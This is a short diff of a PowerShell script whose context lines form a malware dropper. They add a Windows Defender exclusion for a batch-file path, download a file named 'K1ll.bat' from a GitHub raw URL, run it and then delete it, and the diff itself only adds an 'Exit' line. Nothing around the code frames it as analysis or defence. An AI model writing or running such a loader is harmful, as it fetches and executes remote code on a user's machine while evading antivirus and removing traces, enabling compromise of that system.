@@ -12,3 +12,4 @@ Add-MpPreference -ExclusionPath $batPath  -ErrorAction SilentlyContinue | Out-Nu
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/K1ll.bat" -OutFile $batPath
 Start-Process -FilePath $batPath -Wait | Out-Null
 Remove-Item -Path $batPath -Force -ErrorAction SilentlyContinue
+Exit
